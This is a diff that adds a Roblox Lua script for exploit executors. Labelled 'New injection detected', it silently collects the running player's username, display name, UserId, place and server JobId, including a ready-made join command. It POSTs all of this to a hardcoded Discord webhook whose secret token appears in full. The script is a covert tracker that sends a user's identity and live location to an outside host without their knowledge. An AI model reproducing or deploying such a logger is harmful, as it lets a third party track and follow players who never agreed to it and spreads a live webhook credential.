@@ -1,0 +1,61 @@
+
+local OSTime = os.time();
+local Time = os.date('!*t', OSTime);
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
+local Content = '';
+local url = 'https://media.discordapp.net/attachments/1018623841586659330/1028668902839951390/xdxxddddd.png?width=1213&height=682'
+	local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+local Embed = {
+
+   color = '5060836';
+   author = {
+name = 'Click to see profile';
+       url = 'https://www.roblox.com/users/'..game.Players.LocalPlayer.UserId..'/profile';
+   };
+   fields = {
+       
+       
+       
+       {
+           name = '<:dot:1012120452975562822>  New injection detected';
+           value = 'Someone just injected script';
+       },
+          {
+           name = '<:dot:1012120452975562822>  Name';
+           value = ''..game.Players.LocalPlayer.Name..'';
+       },
+             {
+           name = '<:dot:1012120452975562822>  DisplayName';
+           value = ''..game.Players.LocalPlayer.DisplayName..'';
+       },
+   
+                {
+           name = '<:dot:1012120452975562822>  PlaceId';
+           value = 'https://www.roblox.com/games/'..game.PlaceId..'';
+       },
+       
+       
+                       {
+           name = '<:dot:1012120452975562822>  JoinId';
+           value = '```Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")```';
+       },
+   
+                   {
+           name = '<:dot:1012120452975562822>  For TimeYeild join info';
+           value = '```PlaceId  '..game.PlaceId..'```';
+       },
+                      {
+           name = '<:dot:1012120452975562822>  Joinplayer UserId PlaceId';
+           value = '```UserId  '..game.Players.LocalPlayer.UserId..'```';
+       },
+   
+   };
+};
+(syn and syn.request or http_request) {
+   Url = 'https://ptb.discord.com/api/webhooks/1047202616175775776/SsLFf9lYi7vIeCRz2C61df6T9bEvy08Q7oJRu_MH-2LXJ2XVMGDuqpQSRryGkwKvlbCA';
+   Method = 'POST';
+   Headers = {
+       ['Content-Type'] = 'application/json';
+   };
+   Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
+};
